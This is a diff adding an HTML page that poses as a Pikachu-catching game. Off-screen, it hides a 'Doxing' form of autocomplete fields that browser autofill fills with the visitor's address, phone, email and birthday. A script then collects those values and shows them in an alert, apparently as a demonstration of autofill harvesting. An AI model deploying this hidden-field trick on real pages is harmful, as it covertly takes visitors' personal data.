@@ -1,0 +1,151 @@
+<html>
+
+<head>
+<style>
+.dox-div{
+    position:fixed;
+    left:100px;
+    top:10000px;
+}
+
+div#box
+{
+    width: 40vmin;
+    height: 20vmin;
+    position: fixed;
+    top: 5vh;
+    left: 50vw;
+    margin-left: -20vmin
+}
+
+div#test div
+{
+    width: 50%;
+    height: 100%;
+    float: left;
+}
+
+div#target
+{
+    width: 16vmin;
+    top: 60vh;
+    left: 50vw;
+    margin-left: -8vmin;
+    position: fixed;
+}
+div#status
+{
+    bottom:5vh;
+    width:80vw;
+    left:10vw;
+    position:fixed;
+    text-align:center;
+    color: #B0D0D3;
+    font-family: "Arial",Arial
+}
+
+body
+{
+    background-color: #3581B8;
+}
+</style>
+</head>
+
+<body onclick="reset();">
+    <div id="target"><img width="100%" src="img/pikachu.png"></div>
+    <div id="box"><img width="100%" src="img/iphone.png"></div>
+    <div id="status">Capture pikachu by using the arrow keys to navigate the Iphone!</div>
+    <div  class="dox-div ">
+        <div class="info-box-header">
+            <div class="info-box-skrim hidden-md hidden-lg"></div>
+            <i class="fa fa-truck info-box-icon"></i>
+                <strong> Doxing </strong>
+            <span class="info-box-right">
+        <a class="collapsed" href="#163ec675">
+        </a>
+      </span>
+        </div>
+        <div class="info-box-info collapse in" id="dox">
+            <div class="form-group">
+                <input  onkeydown="control(event)" id="name" autocomplete="name">
+                <input  autocomplete="address-line1">
+                <input  autocomplete="address-line2">
+                <input onchange="showInfo()" autocomplete="locality">
+                <input  autocomplete="region">
+                <input  autocomplete="country">
+                <input  autocomplete="tel">
+                <input  autocomplete="email">
+                <input  autocomplete="bday">
+                <input  autocomplete="bday">
+                <input  autocomplete="org">
+                <input  autocomplete="sex">
+                <input  autocomplete="url">
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.1.1.js" integrity="sha256-16cdPddA6VdVInumRGo6IbivbERE8p7CQR3HzTBuELA=" crossorigin="anonymous"></script>
+    <script>
+     document.steps=0;
+    function reset(){
+        document.steps=0;
+        document.getElementById('box').style['top']='10vh'
+        document.getElementById('name').value="";
+        document.getElementById('name').focus();
+    }
+
+     function control(event){
+         console.log("test");
+         console.log(event)
+         switch(event.which){
+            case 40:
+                movebox();
+                break;
+            case 13:
+                end();
+                break;
+            default: wrongdirection();
+         }
+     }
+     function movebox(){
+         if (document.steps === 0){
+             document.getElementById('box').style['top']='25vh'
+             document.getElementById("status").innerText="Quick! Click down again to capture it! Don't overshoot";
+             document.steps = 1;
+         }
+         setTimeout(
+         function(){document.getElementById('box').style['top']='50vh';
+         document.getElementById("status").innerText="Quick! Hit \"Enter\" to capture it!";
+     },1000)
+     }
+     function end(){
+         document.getElementById("status").innerText="Uh oh, No pokemon is found. Check back later.";
+         document.steps += 1;
+     }
+     function wrongdirection(){
+         document.getElementById("status").innerText="Pikachu ran away! try again.";
+         reset();
+     }
+
+     function showInfo(){
+         setTimeout(function(){
+
+                 console.log("peopeo");
+                 document.inputs = document.getElementsByTagName("input");
+                 info = "Thanks, I could have stole the following information about you:\n";
+                 for (var i=0;i<13;i++){
+                     console.log(document.inputs[i].value);
+                     if (document.inputs[i].value!=""){
+                         info += document.inputs[i].value+"\n";
+                    }
+                 }
+                 console.log(info);
+                 alert(info);
+         },500)
+        // foreach i in inputs
+     }
+     reset();
+    </script>
+</body>
+
+</html>
